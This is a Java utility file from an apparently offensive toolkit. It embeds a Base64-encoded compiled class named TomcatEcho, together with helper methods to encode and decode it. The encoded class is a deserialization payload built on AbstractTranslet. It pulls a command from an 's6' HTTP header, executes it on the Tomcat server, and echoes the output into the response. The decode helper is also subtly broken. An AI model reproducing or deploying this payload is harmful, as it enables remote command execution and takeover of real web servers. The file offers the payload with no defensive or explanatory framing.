package cn.safe6.util;


import net.bytebuddy.ByteBuddy;

import java.util.Base64;

public class GetByteCode {

    public static void main(String[] args) throws Exception {
        decodeData();
    }

    public static void decodeData() throws ClassNotFoundException {

        String data = "yv66vgAAADQAcQoAGwAvCgAwADEHADIHADMKAAMANAoAMAA1BwA2BwA3CgAIAC8IADgKAAgAOQoAOgA7CgAIADwKAAgAPQoAMAA+CgA/AEAKADAAQQoAQgBDCABECgBFAEYKAEIARwgASAoAQgBJCgBKAEsKAEIATAcATQcATgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAdTGNuL3NhZmU2L3BheWxvYWQvVG9tY2F0RWNobzsBAApnZXRQYXlsb2FkAQAEKClbQgEACWNsYXNzUG9vbAEAFUxqYXZhc3Npc3QvQ2xhc3NQb29sOwEAB2N0Q2xhc3MBABNMamF2YXNzaXN0L0N0Q2xhc3M7AQAGbWV0aG9kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwcATwEAClNvdXJjZUZpbGUBAA9Ub21jYXRFY2hvLmphdmEMABwAHQcAUAwAUQBSAQAYamF2YXNzaXN0L0NsYXNzQ2xhc3NQYXRoAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAwAHABTDABUAFUBAB1vcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0SW5mbwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAKdG9tY2F0RWNobwwAVgBXBwBYDABZAFoMAFYAWwwAXABdDABeAF8HAGAMAGEAXQwAYgBfBwBjDABkAGUBAk8gICAgcHVibGljIHN0YXRpYyBPYmplY3QgZ2V0RmllbGQoT2JqZWN0IG9iaixTdHJpbmcgZmllbGROYW1lKSB0aHJvd3MgRXhjZXB0aW9uewogICAgICAgIGphdmEubGFuZy5yZWZsZWN0LkZpZWxkIGYwID0gbnVsbDsKICAgICAgICBDbGFzcyBjbGFzID0gb2JqLmdldENsYXNzKCk7CgogICAgICAgIHdoaWxlIChjbGFzICE9IE9iamVjdC5jbGFzcyl7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBmMCA9IGNsYXMuZ2V0RGVjbGFyZWRGaWVsZChmaWVsZE5hbWUpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0gY2F0Y2ggKE5vU3VjaEZpZWxkRXhjZXB0aW9uIGUpewogICAgICAgICAgICAgICAgY2xhcyA9IGNsYXMuZ2V0U3VwZXJjbGFzcygpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoZjAgIT0gbnVsbCl7CiAgICAgICAgICAgIGYwLnNldEFjY2Vzc2libGUodHJ1ZSk7CiAgICAgICAgICAgIHJldHVybiBmMC5nZXQob2JqKTsKICAgICAgICB9ZWxzZSB7CiAgICAgICAgICAgIHRocm93IG5ldyBOb1N1Y2hGaWVsZEV4Y2VwdGlvbihmaWVsZE5hbWUpOwogICAgICAgIH0KICAgIH0HAGYMAGcAaAwAaQBqAQ7/ICAgICAgICB0cnkgewogICAgICAgICAgICBib29sZWFuIGZsYWcgPSBmYWxzZTsKICAgICAgICAgICAgVGhyZWFkW10gdGhyZWFkcyA9IChUaHJlYWRbXSkgZ2V0RmllbGQoVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS5nZXRUaHJlYWRHcm91cCgpLCJ0aHJlYWRzIik7CiAgICAgICAgICAgIGZvciAoaW50IGk9MDtpPHRocmVhZHMubGVuZ3RoO2krKyl7CiAgICAgICAgICAgICAgICBUaHJlYWQgdGhyZWFkID0gdGhyZWFkc1tpXTsKICAgICAgICAgICAgICAgIGlmICh0aHJlYWQgIT0gbnVsbCl7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRocmVhZE5hbWUgPSB0aHJlYWQuZ2V0TmFtZSgpOwogICAgICAgICAgICAgICAgICAgIGlmICghdGhyZWFkTmFtZS5jb250YWlucygiZXhlYyIpICYmIHRocmVhZE5hbWUuY29udGFpbnMoImh0dHAiKSl7CiAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdCB0YXJnZXQgPSBnZXRGaWVsZCh0aHJlYWQsInRhcmdldCIpOwogICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QgZ2xvYmFsID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHRhcmdldCBpbnN0YW5jZW9mIFJ1bm5hYmxlKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIOmcgOimgemBjeWOhuWFtuS4reeahCB0aGlzJDAvaGFuZGxlci9nbG9iYWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIOmcgOimgei/m+ihjOW8guW4uOaNleiOt++8jOWboOS4uuWtmOWcqOaJvuS4jeWIsOeahOaDheWGtQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnbG9iYWwgPSBnZXRGaWVsZChnZXRGaWVsZChnZXRGaWVsZCh0YXJnZXQsInRoaXMkMCIpLCJoYW5kbGVyIiksImdsb2JhbCIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoTm9TdWNoRmllbGRFeGNlcHRpb24gZmllbGRFeGNlcHRpb24pewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpZWxkRXhjZXB0aW9uLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC8vIOWmguaenOaIkOWKn+aJvuWIsOS6hiDmiJHku6znmoQgZ2xvYmFsIO+8jOaIkeS7rOWwseS7jumHjOmdouiOt+WPluaIkeS7rOeahCBwcm9jZXNzb3JzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChnbG9iYWwgIT0gbnVsbCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYXZhLnV0aWwuTGlzdCBwcm9jZXNzb3JzID0gKGphdmEudXRpbC5MaXN0KSBnZXRGaWVsZChnbG9iYWwsInByb2Nlc3NvcnMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoaT0wO2k8cHJvY2Vzc29ycy5zaXplKCk7aSsrKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0SW5mbyByZXF1ZXN0SW5mbyA9IChvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0SW5mbykgcHJvY2Vzc29ycy5nZXQoaSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3RJbmZvICE9IG51bGwpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0IHRlbXBSZXF1ZXN0ID0gKG9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3QpIGdldEZpZWxkKHJlcXVlc3RJbmZvLCJyZXEiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3JnLmFwYWNoZS5jYXRhbGluYS5jb25uZWN0b3IuUmVxdWVzdCByZXF1ZXN0ID0gKG9yZy5hcGFjaGUuY2F0YWxpbmEuY29ubmVjdG9yLlJlcXVlc3QpIHRlbXBSZXF1ZXN0LmdldE5vdGUoMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yZy5hcGFjaGUuY2F0YWxpbmEuY29ubmVjdG9yLlJlc3BvbnNlIHJlc3BvbnNlID0gcmVxdWVzdC5nZXRSZXNwb25zZSgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmcgY21kID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8g5LuOIGhlYWRlciDkuK3ojrflj5YKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuZ2V0SGVhZGVyKCJzNiIpICE9IG51bGwpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY21kID0gcmVxdWVzdC5nZXRIZWFkZXIoInM2Iik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjbWQgIT0gbnVsbCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGlucHV0U3RyZWFtID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoIiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzID0gbmV3IGJ5dGVbMTAyNF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgbiA9IDAgOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChuPWlucHV0U3RyZWFtLnJlYWQoYnl0ZXMpKSAhPSAtMSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuYXBwZW5kKG5ldyBTdHJpbmcoYnl0ZXMsMCxuKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgamF2YS5pby5Xcml0ZXIgd3JpdGVyID0gcmVzcG9uc2UuZ2V0V3JpdGVyKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUoIiQkJFxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUoc2IudG9TdHJpbmcoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUoIiQkJFxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIuZmx1c2goKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0U3RyZWFtLmNsb3NlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGFnID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmbGFnKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGZsYWcpewogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpewogICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgIH0MAGsAbAcAbQwAbgBvDABwACQBABtjbi9zYWZlNi9wYXlsb2FkL1RvbWNhdEVjaG8BABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAE2phdmFzc2lzdC9DbGFzc1Bvb2wBAApnZXREZWZhdWx0AQAXKClMamF2YXNzaXN0L0NsYXNzUG9vbDsBABQoTGphdmEvbGFuZy9DbGFzczspVgEAD2luc2VydENsYXNzUGF0aAEALChMamF2YXNzaXN0L0NsYXNzUGF0aDspTGphdmFzc2lzdC9DbGFzc1BhdGg7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEACG5hbm9UaW1lAQADKClKAQAcKEopTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAltYWtlQ2xhc3MBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhc3Npc3QvQ3RDbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdnZXROYW1lAQAKZ2V0Q3RDbGFzcwEAEWphdmFzc2lzdC9DdENsYXNzAQANc2V0U3VwZXJjbGFzcwEAFihMamF2YXNzaXN0L0N0Q2xhc3M7KVYBABJqYXZhc3Npc3QvQ3RNZXRob2QBAARtYWtlAQA7KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhc3Npc3QvQ3RDbGFzczspTGphdmFzc2lzdC9DdE1ldGhvZDsBAAlhZGRNZXRob2QBABcoTGphdmFzc2lzdC9DdE1ldGhvZDspVgEAFG1ha2VDbGFzc0luaXRpYWxpemVyAQAbKClMamF2YXNzaXN0L0N0Q29uc3RydWN0b3I7AQAXamF2YXNzaXN0L0N0Q29uc3RydWN0b3IBAAxpbnNlcnRCZWZvcmUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAp0b0J5dGVjb2RlACEAGgAbAAAAAAACAAEAHAAdAAEAHgAAAC8AAQABAAAABSq3AAGxAAAAAgAfAAAABgABAAAACgAgAAAADAABAAAABQAhACIAAAAJACMAJAACAB4AAAC/AAQAAwAAAGG4AAJLKrsAA1kSBLcABbYABlcquwADWRIHtwAFtgAGVyq7AAhZtwAJEgq2AAu4AAy2AA22AA62AA9MKyoSBLYAELYAEbYAEisSEyu4ABS2ABUSFk0rtgAXLLYAGCu2ABmwAAAAAgAfAAAAJgAJAAAADgAEAA8AEgAQACAAEgA6ABMARwAUAFEAKQBUAGwAXABtACAAAAAgAAMABABdACUAJgAAADoAJwAnACgAAQBUAA0AKQAqAAIAKwAAAAQAAQAsAAEALQAAAAIALg==";
        Class<? extends Class> aClass = ClassLoader.getSystemClassLoader().loadClass(Base64.getDecoder().decode(data).toString()).getClass();
        System.out.println(aClass);

    }

    public static void encodeData(){
        byte[] code= new ByteBuddy()
                .redefine(cn.safe6.payload.TomcatEcho.class)
                .name("cn.safe6.payload.TomcatEcho")
                .make()
                .getBytes();
        System.out.println(Base64.getEncoder().encodeToString(code));
    }



}
